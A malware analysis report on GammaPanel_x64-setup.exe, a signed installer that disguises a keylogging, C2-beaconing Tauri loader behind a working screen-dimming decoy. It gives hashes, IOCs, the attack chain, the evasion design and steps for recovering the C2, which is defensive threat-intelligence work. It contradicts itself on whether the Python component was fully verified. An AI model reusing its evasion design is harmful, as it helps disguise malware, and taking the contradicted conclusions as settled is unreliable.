# GammaPanel_x64-setup.exe — Tauri+Python Dual-Component Loader / ChaCha-Encrypted C2

**Date**: 2026-06-08  
**Analyst**: REMnux Claude  
**ANY.RUN**: https://app.any.run/tasks/a14d7bc2-b414-4ab5-9c60-283e31535b1a

---

## 1. File Metadata

| Field | Value |
|---|---|
| **Filename** | GammaPanel_x64-setup.exe |
| **SHA256** | `fd11ebd6ca3e460bcd6e34e6c4f715297c5a4818b2bd141b0ea9a1ee794d00b1` |
| **MD5** | `8f8b3e7e33e50f0a9f5c309e926ae68b` |
| **SHA1** | `c62ea6b3f404149dd0cb23c4dfb5870982085378` |
| **Size** | 41,616,984 bytes (39.7 MB) |
| **Type** | PE32 x86 NSIS self-extracting installer |
| **Certificate Issuer** | GlobalSign GCC R45 EV CodeSigning CA 2020 |
| **Certificate Subject** | GANPATI ESTATES LLP |
| **Cert Org Details** | Rajasthan, Jaipur, India — Email: kisanvyas126@gmail.com |
| **Cert Validity** | 2025-06-12 → 2026-06-13 |
| **Cert Serial** | `1a68e8aefbdbd2b972f8d6bd` |
| **VersionInfo ProductName** | GammaPanelApp v0.1.0 |
| **Build Compiler** | MSVC 6 / 2003 (NSIS stub) |
| **PE Timestamp** | 2021-09-25 21:56:47 (NSIS default, not meaningful) |

### Extracted Components

| Component | SHA256 | Type | Build Date |
|---|---|---|---|
| GammaPanelApp.exe | `2663798220714c94e290e6496631d0cc3d9c282663cbe4be0d9a16ec1301f7a7` | PE32+ x64 Rust/Tauri | 2026-05-26 |
| setup.exe | `f4a77c89504c67cd5d60061e8e4e9e7d3819b34d90781c3ccf65ac5e22d0b9d1` | PE32+ x64 PyInstaller (Python 3.14) | 2026-03-12 |
| 81d243bd2c585b0f4821__mypyc.cp314-win_amd64.pyd | `f63901977f642fd25e1f8f93b96af3b5fc4c63888925ab192abca3e33564f30b` | PE64 mypyc compiled extension | 2026-03-06 |
| VC_redist.x64.exe | (legitimate) | Microsoft VC++ 2022 redistributable | — |

---

## 2. Classification

**Classification**: Malicious Dual-Component Loader / Infostealer  
**Confidence**: **HIGH** (ANY.RUN 100/100, "loader" tag; confirmed malicious behavioral indicators)  
**KesaKode Online**: Not applicable (NSIS stub has no matches; GammaPanelApp.exe offline: JloRAT(19)/Splinter(16) — below attribution threshold, discarded)

The installer drops two components behind a "GammaPanel" screen brightness/gamma adjustment lure:

1. **GammaPanelApp.exe** — A heavily obfuscated Tauri v1 (Rust/WebView2) frontend with confirmed malicious indicators: 452 XOR-in-loop instances, ChaCha cipher runtime string decryption, embedded keylogger API, hardware fingerprinting, and a custom Tauri command `stat4x(surl, userAgent, name)` used to beacon collected data to a runtime-decrypted C2 URL.

2. **setup.exe** — A Python 3.14 PyInstaller one-file bundle containing a fully functional f.lux-style gamma adjustment application. After extraction using Python 3.14 and bytecode disassembly via the `dis` module, all 11 `gammapanel.*` modules have been analyzed. No malicious code, C2 URLs, or suspicious network calls were found. The only external network contact is `http://ip-api.com/json/` for IP-based geolocation — standard practice for this class of app. setup.exe is assessed as **legitimate cover story functionality**; the malice in this sample originates entirely from GammaPanelApp.exe.

The use of an **Indian real estate company's EV certificate** (GANPATI ESTATES LLP, Rajasthan) to sign a screen dimming utility is a strong indicator of a stolen or fraudulently obtained signing credential.

---

## 3. Capabilities

### Confirmed Malicious — GammaPanelApp.exe (Tauri Frontend)
- **Runtime string decryption** via ChaCha cipher (8 instances) and ACSS (1 instance)
- **Keylogger API** (Windows keyboard hook — YARA: `KeyloggerApi`)
- **Hardware fingerprinting** (`FingerprintHardware` YARA): `HARDWARE\DESCRIPTION\System\BIOS`, `HKLM` enumeration
- **Custom Tauri command `stat4x(surl, userAgent, name)`**: passes a runtime-decrypted server URL, user-agent string, and victim identifier to the Rust backend for outbound HTTP beaconing
- **HTTP POST form data** (`PostHttpForm` YARA) — sends collected data to C2
- **CSP `**https://*/*`**: allows the embedded WebView2 frontend to reach any external HTTPS endpoint
- Contacts `https://login.live.com/RST2.srf` (WAM/WS-Trust endpoint — possible Windows token theft via WebView2 SSO)
- **Sidecar process launch**: spawns `setup.exe` as a Tauri sidecar over `127.0.0.1:34254`

### Cover Story Functionality — setup.exe (Python 3.14 Backend) — CONFIRMED CLEAN
Fully analyzed via Python 3.14 `dis` bytecode disassembly after extraction with `pyinstxtractor`. All 11 modules inspected; no malicious code found.

- **Gamma control** (`gammapanel.gamma`): `SetDeviceGammaRamp`/`GetDeviceGammaRamp` on all monitors; builds 3×256 WORD ramp from color temperature in Kelvin
- **IP geolocation** (`gammapanel.location`): single GET to `http://ip-api.com/json/?fields=lat,lon,city,status` — free service, no API key; used to derive lat/lon for sunrise/sunset calculation
- **Solar-position scheduling** (`gammapanel.scheduler` + `astral`): drives smooth temperature transitions between day/evening/night periods based on sunrise and sunset times; no time-gating or geo-gating of any other functionality
- **Config** (`gammapanel.config`): reads/writes `%APPDATA%\GammaPanel\settings.json`; keys are day/evening/night temp, transition duration, hotkeys, location mode
- **Autostart** (`gammapanel.autostart`): adds/removes `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` key pointing to the PyInstaller executable — normal for this class of app
- **Fullscreen detection** (`gammapanel.fullscreen`): polls foreground window vs monitor rect; pauses gamma adjustment during fullscreen games/video
- **Hotkeys** (`gammapanel.hotkeys`): pynput-based; toggle, pause, temp up/down (configurable defaults: `ctrl+alt+g`, `ctrl+alt+p`, `ctrl+alt+up/down`)
- **System tray** (`gammapanel.tray`): pystray icon with toggle, pause 1h, disable until sunrise, quit
- **UI** (`gammapanel.ui`): tkinter window with temperature slider (1000–6500K), location display, next-change countdown; Catppuccin Mocha color scheme

### NSIS Installer
- Checks for and silently installs WebView2 (required for Tauri)
- Silently installs VC++ 2022 redistributable via PowerShell: `powershell -WindowStyleHidden -Command Start-Process -FilePath 'vc_redist.x64.exe' -ArgumentList '/install', '/quiet', '/norestart' -Wait`
- Writes registry key `Software\GammaPanel\GammaPanelApp`
- Creates standard uninstall entry under `HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\GammaPanelApp`
- Runs `GammaPanelApp.exe` with `ExecShell "runas"` (privilege escalation) on install complete

---

## 4. Attack Chain

```
GammaPanel_x64-setup.exe (NSIS installer, signed GANPATI ESTATES LLP)
    ├─ Checks/installs WebView2 + VC++ 2022
    ├─ Drops to %LOCALAPPDATA%\GammaPanelApp\:
    │   ├─ GammaPanelApp.exe  (Tauri Rust frontend)
    │   ├─ setup.exe          (PyInstaller Python backend)
    │   └─ VC_redist.x64.exe
    ├─ Registers uninstall key in HKCU
    └─ ExecShell "runas" GammaPanelApp.exe  [PRIVILEGE ESCALATION]
         │
         └─ GammaPanelApp.exe starts
              ├─ Launches setup.exe as sidecar → listens on 127.0.0.1:34254
              ├─ Decrypts C2 URL via ChaCha cipher at runtime
              ├─ WebView2 loads embedded index.html frontend
              │    └─ Invokes: invoke('stat4x', { surl: <C2_URL>, userAgent: <UA>, name: <id> })
              ├─ Rust backend handles stat4x → HTTP POST to C2 with victim data
              ├─ Contacts login.live.com/RST2.srf (possible WAM token theft)
              └─ Keylogger API active
         │
         └─ setup.exe (Python 3.14 backend — cover story component)
              ├─ Mutex: GammaPanelMutex
              ├─ gammapanel.gamma → gamma/color temperature adjustment (stated purpose)
              ├─ gammapanel.location → IP geolocation (for sunrise/sunset calculation)
              ├─ gammapanel.scheduler + astral → schedule color shifts at dusk/dawn
              ├─ gammapanel.autostart → run at login (normal for display utility)
              └─ IPC on 127.0.0.1:34254 → serves data to Tauri frontend
              [actual code unverifiable: mypyc + Python 3.14 zstd PYZ]
```

---

## 5. IOCs

### Network
| Type | Indicator | Notes |
|---|---|---|
| URL | `https://login.live.com/RST2.srf` | WAM/WS-Trust endpoint — ANY.RUN confirmed contact |
| URL | `https://login.live.com/ppsecure/deviceaddcredential.srf` | Microsoft account device credential endpoint |
| Host | `127.0.0.1:34254` | Internal IPC between Tauri frontend and Python sidecar |
| URL | `http://ip-api.com/json/?fields=lat,lon,city,status` | setup.exe geolocation (legitimate, free service) |
| **C2** | **NOT RECOVERED** | ChaCha-encrypted at runtime inside GammaPanelApp.exe |

*Note: The actual C2 URL (`surl` parameter of `stat4x` command) is decrypted via ChaCha cipher at runtime; static extraction is blocked. No external non-Microsoft C2 was observed in sandbox due to likely environment/geo gating. `ip-api.com` is legitimate and used by the cover story component only.*

### Filesystem
| Path | Description |
|---|---|
| `%LOCALAPPDATA%\GammaPanelApp\GammaPanelApp.exe` | Tauri frontend |
| `%LOCALAPPDATA%\GammaPanelApp\setup.exe` | Python backend (PyInstaller) |
| `%LOCALAPPDATA%\GammaPanelApp\VC_redist.x64.exe` | VC++ install helper |
| `%LOCALAPPDATA%\GammaPanelApp\uninstall.exe` | Uninstaller |
| `%LOCALAPPDATA%\com.GammaPanel.app\EBWebView\` | WebView2 profile directory |

### Registry
| Key | Value | Description |
|---|---|---|
| `HKCU\Software\GammaPanel\GammaPanelApp` | `""` = `%LOCALAPPDATA%\GammaPanelApp` | Install path |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\GammaPanelApp` | Various | Uninstall entry |
| `HKCU\Software\GammaPanel\GammaPanelApp` | `Installer Language` | Language setting |

### Mutexes
| Mutex | Binary |
|---|---|
| `GammaPanelMutex` | setup.exe (Python backend) |

### Code Artifacts
| Artifact | Value |
|---|---|
| PDB path | `GammaPanel.pdb` (GammaPanelApp.exe) |
| App identifier | `com.GammaPanel.app` |
| Tauri command | `stat4x` (custom C2 callback) |
| Tauri command params | `surl`, `userAgent`, `name` |
| Publisher string | `GammaPanel` |
| Cert serial | `1a68e8aefbdbd2b972f8d6bd` (GANPATI ESTATES LLP / GlobalSign GCC R45 EV) |

---

## 6. Emulation Results

### speakeasy (runner.py) — GammaPanelApp.exe (amd64, 60s timeout)
- **Result**: No IOCs. Emulation loads binary but halts early; requires WebView2 and Win32 GUI subsystem not emulated by speakeasy.

### speakeasy (runner.py) — setup.exe (amd64, 60s timeout)
- **Result**: No IOCs. PyInstaller bootstrap requires Python 3.14 runtime DLL; not available in speakeasy environment.

### Python 3.14 bytecode extraction (pyinstxtractor + dis)
- Extracted all 11 `gammapanel.*` modules using `pyinstxtractor` under Python 3.14 Docker container
- Disassembled with Python 3.14 `dis` module (pycdc v1.1.2 does not support Python 3.14 bytecode)
- **Result**: No malicious code, C2 URLs, or suspicious network calls found in any module. setup.exe is confirmed clean cover story functionality.

### Angr / manual decrypt
- Not attempted: ChaCha key is embedded within GammaPanelApp.exe's 452 XOR-obfuscated string table; key extraction requires symbolic execution over a large code region that exceeds practical angr scope without substantial manual reversing.

---

## 7. Sandbox Results (ANY.RUN)

| Field | Value |
|---|---|
| **Verdict** | 100/100 — **Malicious activity** |
| **Tags** | `loader` |
| **Behavioral Specs** | `debugOutput`, `multiprocessing`, `networkLoader`, `serviceLauncher`, `privEscalation` |
| **Public Report** | https://app.any.run/tasks/a14d7bc2-b414-4ab5-9c60-283e31535b1a |

**Key behavioral observations**:
- `networkLoader`: sample downloads resources from the internet
- `serviceLauncher`: creates or launches Windows services (consistent with `gammapanel.autostart`)
- `privEscalation`: privilege escalation observed (NSIS `runas`, PowerShell `-Wait`)
- `login.live.com/RST2.srf` contacted (WAM token theft or WebView2 SSO)
- No external C2 observed in sandbox (geo-gating or environment check likely)

---

## 8. Analyst Notes

### Certificate Anomaly
GANPATI ESTATES LLP is an Indian real estate company (Jaipur, Rajasthan). The presence of a personal Gmail address (`kisanvyas126@gmail.com`) in an EV certificate subject field is irregular for a legitimate code-signing certificate, and a real estate firm is an atypical holder of software signing credentials. This cert is almost certainly obtained fraudulently, stolen from a legitimate business, or issued through a compromised CA verification process.

### C2 Not Recovered — Frontend Assets Are ChaCha-Encrypted

Static extraction of the C2 URL was fully attempted and blocked at two layers:

**Layer 1 — Encrypted frontend assets**: GammaPanelApp.exe contains three high-entropy blobs (25KB, 37KB, 147KB) with no recognisable compression or format headers. The string `"stat4x"` does not appear anywhere in the binary as a quoted JS literal — confirming the entire app frontend (HTML + JS) is encrypted before embedding. The 452 XorInLoop hits in the Rust binary are consistent with ChaCha key material being built on the stack at runtime. The Tauri API bundle (45KB) is the only plaintext JS present.

**Layer 2 — Runtime-only decryption**: The Rust backend decrypts the frontend assets using ChaCha before serving them to the WebView2 instance. The JS code containing `invoke('stat4x', { surl: <C2_URL>, ... })` and the logic to construct the C2 URL only exists in memory after decryption — it is never on disk in readable form.

setup.exe (fully analyzed via Python 3.14 bytecode extraction) contains no C2 URL and is confirmed clean.

**Recommended follow-up to recover the C2**:
- **Hook the Tauri asset protocol handler** in GammaPanelApp.exe with a debugger breakpoint after ChaCha decryption — the plaintext `index.html` + `index.js` will be in memory before being handed to WebView2
- **Run under a Windows VM with process memory dumping** — after launch, dump GammaPanelApp.exe's memory and search for `stat4x` as a quoted string; it will be present in the WebView2 heap once the page loads
- **Capture the outbound HTTP request** — the `stat4x` command fires an HTTP POST; a full PCAP in a Windows VM sandbox would capture the destination URL directly

### Architecture Assessment
The Tauri + Python sidecar pattern is effective for malware delivery because:
- Tauri produces signed-looking Rust binaries that evade Electron-specific YARA rules
- The Python sidecar is a fully functional application, providing legitimate behavior that blends with the cover story
- The malicious component (GammaPanelApp.exe) is the only part that requires runtime decryption and C2 contact

### Lure Quality
After full code extraction, the GammaPanel Python application is a well-implemented, properly documented f.lux clone with a clean Catppuccin Mocha UI, configurable hotkeys, smooth temperature transitions, fullscreen detection, and pystray tray icon. This is not a skeleton or stub — the actor invested in building a functional lure that passes casual inspection. The CJK characters in the installer dialog strings (`胤`, `肂`) suggest possible targeting of East Asian users or actor infrastructure reuse.
